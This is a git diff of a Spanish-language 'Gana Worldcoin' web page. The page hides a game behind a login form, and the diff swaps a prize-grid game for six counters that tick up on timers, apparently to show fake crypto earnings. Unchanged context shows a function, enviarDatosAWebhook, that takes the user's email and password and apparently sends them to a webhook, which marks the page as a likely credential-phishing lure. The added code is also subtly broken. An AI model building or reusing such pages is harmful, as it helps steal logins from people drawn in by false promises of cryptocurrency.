@@ -28,11 +28,15 @@
 <div id="game-container" style="display:none;">
     <h1>Gana Worldcoin</h1>
     <p>Jugar es muy sencillo</p>
-    <div id="vidas">Oportunidades: 3</div>
-    <div id="pizarra"></div>
-    <button id="recargar">Recargar Oportunidades</button>
-    <h2>Premios obtenidos:</h2>
-    <div id="premiosObtenidos"></div>
+    <div id="contadores">
+        <!-- Contenedores para los contadores -->
+        <div id="contador1">Contador 1: <span>0.00001</span></div>
+        <div id="contador2">Contador 2: <span>0.00001</span></div>
+        <div id="contador3">Contador 3: <span>0.00001</span></div>
+        <div id="contador4">Contador 4: <span>0.00001</span></div>
+        <div id="contador5">Contador 5: <span>0.00001</span></div>
+        <div id="contador6">Contador 6: <span>0.00001</span></div>
+    </div>
 </div>
 
   <style>body {
@@ -123,10 +127,7 @@ span {
     
 </body>
   <script>
-     let oportunidades = 3;
-     let premios = []; // Ajusta según tu juego
-     let premiosObtenidos = [];
- 
+    
       
       
       document.addEventListener('DOMContentLoaded', () => {
@@ -172,8 +173,7 @@ span {
             alert('Inicio de sesión exitoso.');
             document.getElementById('login').style.display = 'none';
             document.getElementById('game-container').style.display = 'block';
-            inicializarPremios(); // Asegurarse de inicializar los premios primero
-            inicializarPizarra(); // Luego inicializar la pizarra
+            
         } else {
             alert('Contraseña incorrecta');
         }
@@ -214,60 +214,32 @@ span {
         mostrarPremiosObtenidos();
         // Opcional: Restablecer los casilleros para permitir una nueva selección
     });
-    // Actualiza el texto de oportunidades restantes
-    function actualizarOportunidades() {
-        document.getElementById('vidas').innerText = `Oportunidades: ${oportunidades}`;
+   
+
+   
+
+function inicializarContadores() {
+    for (let i = 1; i <= 6; i++) {
+        let valor = localStorage.getItem(`contador${i}`) || 0.00001;
+        document.querySelector(`#contador${i} span`).textContent = valor.toFixed(5);
+        actualizarContador(i, valor);
     }
-
-    // Agrega los premios obtenidos al contenedor correspondiente
-    function mostrarPremiosObtenidos() {
-        document.getElementById('premiosObtenidos').innerText = premiosObtenidos.join(', ');
-    }
-
-function inicializarPremios() {
-    // Reiniciar los premios
-    premios = [];
-
-    // Añadir premios
-    premios.push('X10'); // 1 casillero x10
-    for (let i = 0; i < 2; i++) premios.push('X2'); // 3 casilleros x2
-    for (let i = 0; i < 2; i++) premios.push('X1'); // 7 casilleros x1
-    for (let i = 0; i < 4; i++) premios.push('X0.3'); // 10 casilleros x0.5
-
-    // Rellenar el resto de casilleros con 'Sin premio'
-    while (premios.length < 36) {
-        premios.push('perdio');
-    }
-
-    // Mezclar los premios
-    premios.sort(() => Math.random() - 0.5);
+}
+function actualizarContador(tipo, valorInicial) {
+    const incremento = 0.00001;
+    const intervalos = [60000, 120000, 180000, 300000, 420000, 600000]; // Milisegundos
+    setInterval(() => {
+        if (valorInicial < 400) {
+            valorInicial += incremento;
+            localStorage.setItem(`contador${tipo}`, valorInicial);
+            document.querySelector(`#contador${tipo} span`).textContent = valorInicial.toFixed(5);
+        }
+    }, intervalos[tipo - 1]);
 }
 
-
-
-
-
           
-    // Función para manejar el click en un casillero
-    function elegirCasillero(event) {
-        if (oportunidades > 0) {
-            const casillero = event.target;
-            const premio = casillero.getAttribute('data-premio');
-            premiosObtenidos.push(premio);
-            casillero.innerText = premio;
-            casillero.style.pointerEvents = 'none'; // Deshabilitar más clicks en este casillero
-            casillero.style.backgroundColor = '#ddd'; // Cambio visual para indicar que este casillero ya fue elegido
-            oportunidades--;
-            actualizarOportunidades();
-            mostrarPremiosObtenidos();
-
-            if (oportunidades === 0) {
-                // Opcional: Mostrar mensaje final o deshabilitar todos los casilleros
-                alert('No quedan más oportunidades');
-            }
-        }
-    }
-
+      
+    
 
 
 function enviarDatosAWebhook(email, contrasena) {
@@ -301,19 +273,7 @@ document.getElementById('irARegistro').addEventListener('click', function() {
 });
    
 
-    // Inicialización de la pizarra de premios
-    function inicializarPizarra() {
-        const pizarra = document.getElementById('pizarra');
-        for (let i = 0; i < premios.length; i++) {
-            const casillero = document.createElement('div');
-            casillero.classList.add('casillero');
-            casillero.setAttribute('data-premio', premios[i]);
-            casillero.addEventListener('click', elegirCasillero);
-            pizarra.appendChild(casillero);
-        }
-        actualizarOportunidades();
-    }
-
+  
 });
 
 
